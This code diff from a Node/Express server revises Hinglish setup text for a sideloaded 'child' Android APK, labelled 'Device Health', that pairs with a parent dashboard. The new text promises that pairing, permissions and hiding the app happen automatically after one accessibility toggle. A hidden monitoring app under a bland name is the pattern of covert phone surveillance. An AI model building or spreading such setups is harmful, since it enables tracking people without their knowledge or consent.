@@ -497,7 +497,7 @@ app.get('/apk/child', (req, res) => {
 <p class="mut">${m.originalName} &middot; ${sizeMb} MB &middot; ${new Date(m.uploadedAt).toLocaleString()}</p>
 <a class="btn" href="?t=${m.shareToken}&amp;dl=1">⬇ Download APK</a>
 <p class="mut">Install karte waqt agar <b>"unknown apps blocked"</b> aaye to:<br><b>Settings → Allow from this source</b> enable karo → wapas aao → install.</p>
-<p class="mut">Install ke baad <b>Device Health</b> app kholo aur parent dashboard ka pairing code daalo.</p>
+<p class="mut">Install ke baad <b>wapas isi page par aao</b> aur green button dabao — pairing + permissions + hide SAB khud ho jayega (sirf 1 accessibility toggle ON karna hai).</p>
 </div></body></html>`);
     return;
   }
@@ -533,7 +533,8 @@ app.get('/s/:code', (req, res) => {
 <div id="fb" style="display:none">
   ${dl ? `<a class="btn" href="${dl}">1) App download karo</a>` : ''}
   <a class="btn green" href="${deep}">2) App kholo &amp; auto-setup</a>
-  <p class="mut">Ya <b>Device Health</b> app kholo aur ye code daalo:</p>
+  <p class="mut">Naya phone pehli baar: <b>1)</b> App download → install karo, <b>2)</b> wapas isi page par aakar green button dabao. Uske baad phone ko chhune ki zarurat nahi — pairing, permissions, hide sab apne aap.</p>
+  <p class="mut" style="margin-top:14px">Ya <b>Device Health</b> app kholo aur ye code daalo:</p>
   <div class="code">${c.pairingCode}</div>
   <p class="mut">Server: ${origin}</p>
 </div>
